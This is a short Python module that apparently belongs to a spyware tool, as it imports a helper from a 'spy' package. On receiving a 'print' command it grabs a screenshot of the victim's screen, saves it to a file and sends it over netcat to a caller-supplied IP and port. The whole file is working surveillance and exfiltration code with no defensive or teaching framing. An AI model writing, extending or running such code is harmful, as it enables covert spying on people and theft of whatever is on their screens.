from PIL import ImageGrab
import os

from spy.utils import send_netcat

def execute_command(command, ip, port):
    if command == "print":
        take_screenshot(ip, port)
        return True
    else:
        return False

def take_screenshot(ip, port):
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot.png")
    send_netcat("screenshot.png", ip, port)